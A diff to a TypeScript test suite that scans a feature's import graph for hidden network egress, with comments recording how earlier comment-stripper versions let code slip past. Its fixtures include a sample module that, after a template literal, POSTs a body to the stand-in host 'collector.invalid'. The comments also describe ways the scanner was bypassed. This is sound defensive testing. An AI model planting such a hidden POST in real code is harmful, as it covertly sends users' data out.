@@ -62,7 +62,10 @@
 //   E4  AND THE WALK'S OWN SCOPE IS DECLARED. Every production module in the feature's three
 //       directories is reachable from the handler today; one that is not is UNMEASURED by
 //       E1/E1c/E2 and has to say so on `FEATURE_MODULES_NOT_REACHABLE`, so the day it is
-//       wired up the census that starts covering it is read by somebody.
+//       wired up the census that starts covering it is read by somebody. E4b says the same
+//       about `packages/shared/src`, which the walk reaches THROUGH ITS BARREL — so "egress
+//       anywhere under shared" is only true while every file there is exported from
+//       `index.ts`, and that is a clause rather than an assumption.
 //
 // ── WHAT THIS FILE HONESTLY CANNOT SEE ──
 // Written by asking "how would I get past this NOW?", not by editing an older sentence. Each
@@ -91,17 +94,22 @@
 //      `gateway/routes/__tests__/only-the-card-can-post-a-report.test.ts`.
 //   7. A TRAILING COMMENT — `const x = 1; // import https from 'node:https'` — counts as an
 //      edge, because the stripper deliberately does not try to find a `//` inside a line
-//      (a URL holds two slashes and a string can hold anything). That is an OVER-read: it
-//      can only ADD a module to a manifest, never remove one, so it fails safe.
-//      ⚠ THE SAME SENTENCE USED TO BE WRITTEN ABOUT COMMENTS IN GENERAL AND IT WAS FALSE.
-//      The reader was a line-start classifier that dropped the WHOLE line, so
-//      `/* keep */ import https from 'node:https';` and a two-line namespace import whose
-//      second line begins with `*` were DISCARDED AS COMMENTS — code deleted before the
-//      specifier reader saw it, and review's plants g1/g2 rode all three censuses green at
-//      157/157 with a live `https.request({ method: 'POST' })` inside a blessed module. The
-//      stripper now removes comment TEXT only (see `stripComments`), which is why this row is
-//      about a trailing `//` and nothing else. A block comment that OPENS mid-line is
-//      likewise not detected, and is the same safe over-read.
+//      (a URL holds two slashes and a string can hold anything). A block comment that OPENS
+//      mid-line is likewise not detected. Both are OVER-reads: they can only ADD a module to
+//      a manifest, never remove one, so they fail safe.
+//      ⚠ THIS ROW HAS BEEN WRONG TWICE, IN THE DANGEROUS DIRECTION, AND BOTH ARE WORTH THE
+//      LINES. (a) It once said "comments fail safe" about comment handling IN GENERAL, while
+//      the reader was a line-start classifier that dropped the WHOLE line: review's g1
+//      (`/* keep */ import https from 'node:https';`) and g2 (a namespace import wrapped onto
+//      a `*`-leading second line) were CODE DELETED BEFORE THE READER SAW IT, green at
+//      157/157 with a live POST in a blessed module. (b) The fix for (a) blanked every line
+//      until the next `*/`, so a line-start `/*` INSIDE A TEMPLATE LITERAL swallowed the real
+//      code after the template — re-review's h3, green at 164/164, on bytes where the reader
+//      it replaced scored `['node:https']`. Both are closed and both are pinned by fixtures
+//      (h3 asks whether CODE survived, which is the question the first five rows did not ask).
+//      The residue is bounded and stated in `stripComments`: a `*`-leading line of real code
+//      immediately inside an UNTERMINATED block comment would still be dropped, which cannot
+//      occur in a module that compiles.
 //   8. RUNTIME REACHABILITY. The walk over-approximates deliberately (an erased `import type`
 //      is counted), so a module here may not be reachable when the process runs. Same
 //      direction as the sibling census's prong C, and for the same reason: a type-only edge
@@ -293,6 +301,18 @@ const FEATURE_PACKAGES: readonly string[] = [
 ];
 
 /**
+ * E4b's REGISTER — the same property for the FIRST-PARTY SHARED PACKAGE, which I5 brought into
+ * scope and which arrived without one (re-review NB2).
+ *
+ * Resolving `@dojo/shared` makes the walk cover everything reachable from the BARREL, which is
+ * not the same claim as "everything under `packages/shared/src`": a new `shared/src/wire.ts`
+ * holding `fetch(…, { method: 'POST' })` and not exported from `index.ts` was green and
+ * declared nowhere. All 12 production files under that directory reach the barrel today, so
+ * the register costs zero churn and buys the day one of them stops.
+ */
+const SHARED_MODULES_NOT_REACHABLE: readonly string[] = [];
+
+/**
  * E4's REGISTER. A production module in the feature's own directories that the handler cannot
  * reach is UNMEASURED by E1 and E2, so it is declared rather than absent.
  *
@@ -336,34 +356,49 @@ const SPEC = /(?:\bfrom\s*|\bimport\s*\(\s*|\brequire\s*\(\s*|\bimport\s*)(['"`]
 // SO THIS STRIPPER REMOVES COMMENT **TEXT**, NEVER A LINE OF CODE, and it tracks state:
 //
 //   · a line whose first non-space characters are `//`  → the line's content goes;
-//   · a `/*` at the start of a line opens a SPAN: the span's lines go, and when the `*/`
-//     arrives, WHATEVER FOLLOWS IT ON THAT LINE IS KEPT — which is exactly what g1 needs;
-//   · nothing else is treated as a comment, so a `*`-leading continuation line is only
-//     dropped when a span is actually open, and g2's second line survives.
+//   · a `/*` at the start of a line opens a RUN: that line goes, and when the `*/` arrives,
+//     WHATEVER FOLLOWS IT ON THAT LINE IS KEPT — which is exactly what g1 needs;
+//   · while a run is open, only `*`-LEADING lines are dropped — the JSDoc continuation
+//     shape. The FIRST line that is neither `*`-leading nor a close ENDS THE RUN AND IS
+//     KEPT. Nothing else is treated as a comment, so g2's `* as https from …` survives
+//     (no run is open there).
 //
-// WHY "AT THE START OF A LINE" AND NOT ANYWHERE: a `/*` sequence appears inside ordinary
-// strings in this tree (`'**/*.ts'` is a glob), and a stripper that opened a span on one
-// would swallow the real code after it — an UNDER-read, the dangerous direction. Bounding the
-// open to a line start means every remaining mistake is an OVER-read: a mid-line `/*` or a
-// trailing `//` leaves comment text in the source, which can only ADD a module to a manifest.
-// Both directions are pinned by fixtures below before anything rests on this.
+// ⚠ THAT LAST RULE IS FIX ROUND 2, AND IT IS WHY THE RUN IS NOT A PLAIN SPAN (re-review NB1).
+// Round 1 blanked every line until the next `*/`, and a line-start `/*` INSIDE A STRING opens
+// one just as readily as a real comment does — a multi-line template whose content line begins
+// `/* …` is ordinary in a tree that stores prose and pasteable code samples. Measured in
+// `report/window.ts`: a `WINDOW_HELP` template with such a line, followed by
+// `require('node:https')` and a POST, rode all three censuses GREEN at 164/164 — while the OLD
+// line-start classifier yields `['node:https']` on the same bytes. The fix for C1 had re-opened
+// C1's own shape through a different door, and three lines of prose above it claimed it could
+// not. Ending the run at the first non-continuation line closes it: the template's closing
+// backtick line ends the run, and the code after it is read.
+//
+// WHY A LINE START, AND WHAT IS LEFT. A `/*` appears inside ordinary strings (`'**/*.ts'` is a
+// glob), so an "anywhere" rule would swallow the code after a glob. With the run bounded at
+// both ends, EVERY remaining mistake is an OVER-read — a mid-line `/*` or a trailing `//`
+// leaves comment text in the source, which can only ADD a module to a manifest — with ONE
+// bounded exception, stated rather than claimed away: a `*`-leading line of real code
+// immediately inside an unterminated block comment would still be dropped. That cannot happen
+// in a module that compiles (an unterminated block comment is a syntax error, and `npm run
+// typecheck` runs over this tree), and inside a string a `*`-leading line is string content
+// and not an edge. Both directions are pinned by fixtures below, including the under-read one.
 function stripComments(code: string): string {
   const out: string[] = [];
-  let inSpan = false;
+  let inRun = false;
   for (const line of code.split('\n')) {
-    if (inSpan) {
-      const close = line.indexOf('*/');
-      if (close === -1) { out.push(''); continue; }
-      inSpan = false;
-      out.push(line.slice(close + 2));          // KEEP the code after the close
-      continue;
-    }
     const lead = line.trimStart();
+    if (inRun) {
+      const close = line.indexOf('*/');
+      if (close !== -1) { inRun = false; out.push(line.slice(close + 2)); continue; }
+      if (lead.startsWith('*')) { out.push(''); continue; }   // a JSDoc continuation line
+      inRun = false; out.push(line); continue;                // NOT a continuation: keep it
+    }
     if (lead.startsWith('//')) { out.push(''); continue; }
     if (lead.startsWith('/*')) {
       const open = line.indexOf('/*');
       const close = line.indexOf('*/', open + 2);
-      if (close === -1) { inSpan = true; out.push(''); continue; }
+      if (close === -1) { inRun = true; out.push(''); continue; }
       out.push(line.slice(close + 2));          // a one-line block comment in front of code
       continue;
     }
@@ -484,11 +519,14 @@ describe('the specifier reader sees every import spelling that creates an edge',
     expect(specifiersIn(`// an old \`await import('node:https')\` hack\nconst x = 1;`)).toEqual([]);
   });
 
-  // ── THE COMMENT STRIPPER'S OWN VOCABULARY (review C1) ────────────────────────────────
-  // These four rows are the Critical. The old line-start classifier DELETED CODE, and these
-  // are the two shapes it deleted plus the two it must still get right in the other
-  // direction. They are specifier-reader rows and not egress rows on purpose: the defect was
-  // upstream of the vocabulary, so it is pinned where the text is read.
+  // ── THE COMMENT STRIPPER'S OWN VOCABULARY (review C1, re-review NB1) ─────────────────
+  // SEVEN rows, and they are two Criticals' worth of history. The old line-start classifier
+  // DELETED CODE (g1, g2); round 1's span stripper fixed those and DELETED CODE AGAIN through
+  // a `/*` inside a template literal (h3, h2) while asserting three lines above itself that
+  // it could not. So the table pins BOTH directions explicitly: four rows where text must
+  // survive the stripper, three where comment text must not. They are specifier-reader and
+  // egress-reader rows rather than census rows on purpose — the defect was upstream of the
+  // vocabulary both times, so it is pinned where the text is read.
   it('KEEPS an import that sits behind a one-line block comment (g1)', () => {
     // `/* keep */ import https from 'node:https';` — one token in front of real code. The old
     // reader dropped the whole line and the import vanished before the vocabulary saw it.
@@ -523,6 +561,45 @@ describe('the specifier reader sees every import spelling that creates an edge',
     // this counts as an edge. It can only ADD a name to a manifest.
     expect(specifiersIn(`const x = 1; // import https from 'node:https';`))
       .toEqual(['node:https']);
+  });
+
+  // ── THE UNDER-READ DIRECTION, WHICH IS THE ONE THAT HIDES A POST (re-review NB1) ──────
+  // Round 1's stripper blanked every line until the next `*/`, so a line-start `/*` INSIDE A
+  // TEMPLATE LITERAL deleted the real code that followed the template. This is the reviewer's
+  // h3, byte for byte, and it is the row the file was missing: every other stripper row asks
+  // "did comment text survive?" (an over-read, safe); this one asks "did CODE survive?".
+  const H3 = [
+    'export const WINDOW_HELP = `',
+    '/* a block an agent may paste when it asks for a wider window',
+    '`;',
+    'const sendWindowNote = async (body: string): Promise<void> => {',
+    "  const https = require('node:https');",
+    "  const r = https.request({ host: 'collector.invalid', path: '/ingest', method: 'POST' });",
+    '  r.end(body);',
+    '};',
+  ].join('\n');
+
+  it('KEEPS the code after a template literal whose CONTENT line starts with a block comment (h3)', () => {
+    expect(
+      specifiersIn(H3),
+      'a `/*` inside a template literal opened a comment span and swallowed the real code '
+      + 'after the template — the under-read class, and the one direction that HIDES a way out '
+      + 'rather than inventing one. Round 1 scored [] here while the reader it replaced scored '
+      + "['node:https'] on the same bytes.",
+    ).toEqual(['node:https']);
+  });
+
+  it('...and the egress reader sees the POST in that same shape (h2)', () => {
+    // The `fetch(` variant. Round 1 missed it here and it was caught only by the OLD sibling
+    // census, which strips no comments at all for its fetch grep — i.e. by luck, not by law.
+    const h2 = H3
+      .replace("  const https = require('node:https');\n", '')
+      .replace(
+        "https.request({ host: 'collector.invalid', path: '/ingest', method: 'POST' })",
+        "fetch('https://collector.invalid/ingest', { method: 'POST' })",
+      );
+    expect(egressMarkersIn(h2), 'the POST after the template was deleted as comment text')
+      .toContain('fetch(');
   });
 });
 
@@ -820,6 +897,13 @@ describe('E4 — the walk\'s scope is declared, so an unwired module is not a si
     ].sort();
     expect(onDisk.length, 'the feature directories look empty — this clause is reading the '
       + 'wrong paths').toBeGreaterThan(30);
+    // ⚠ BOTH DIRECTIONS OF THE AGREEMENT (re-review NB4). The loop below proves every file the
+    // scan found is matched by FEATURE_DIRS; this line proves the converse — a FOURTH pattern
+    // added to FEATURE_DIRS without a root above would widen E1/E1c while leaving its
+    // directory outside the register, which is the gap NB2 found in the shared package.
+    expect(FEATURE_DIRS.length, 'FEATURE_DIRS and this clause\'s hardcoded roots have drifted: '
+      + 'a pattern was added without a scan root, so its directory has no unreachable-module '
+      + 'register').toBe(3);
     for (const f of onDisk) {
       expect(inFeature(f), `${f} is on disk in a feature directory but FEATURE_DIRS does not `
         + 'match it — the two halves of this clause disagree').toBe(true);
@@ -836,5 +920,26 @@ describe('E4 — the walk\'s scope is declared, so an unwired module is not a si
       + 'deliberately not reachable, name it on FEATURE_MODULES_NOT_REACHABLE with the reason, '
       + 'and that one-line edit IS the review.',
     ).toEqual([...FEATURE_MODULES_NOT_REACHABLE].sort());
+  });
+
+  // ── E4b: THE SAME PROPERTY FOR THE SHARED PACKAGE (re-review NB2) ────────────────────
+  // I5 made the walk follow `@dojo/shared`, which covers everything reachable from the BARREL
+  // — a narrower claim than "everything under packages/shared/src", and the difference was
+  // green and undeclared: a `shared/src/wire.ts` with a POST, not exported from `index.ts`.
+  it('every production module in the shared package is reachable from its barrel', () => {
+    const sharedSrc = path.resolve(SRC, '..', '..', 'shared', 'src');
+    const onDisk = featureFilesOnDisk(sharedSrc).sort();
+    expect(onDisk.length, 'packages/shared/src looks empty — this clause is reading the wrong '
+      + 'path').toBeGreaterThan(5);
+    const unreachable = onDisk.filter(m => !CLOSURE.modules.includes(m));
+    expect(
+      unreachable,
+      `production module(s) under packages/shared/src that the barrel does not reach: `
+      + `${unreachable.join(', ')}. The walk follows \`@dojo/shared\` to \`index.ts\`, so a `
+      + 'module the barrel does not export is UNMEASURED by E2 — it can hold any egress it '
+      + 'likes and this file will not see it. Two honest fixes: (1) export it from the barrel, '
+      + 'and E2 starts covering it; (2) if it is deliberately not exported, name it on '
+      + 'SHARED_MODULES_NOT_REACHABLE with the reason — that one-line edit IS the review.',
+    ).toEqual([...SHARED_MODULES_NOT_REACHABLE].sort());
   });
 });
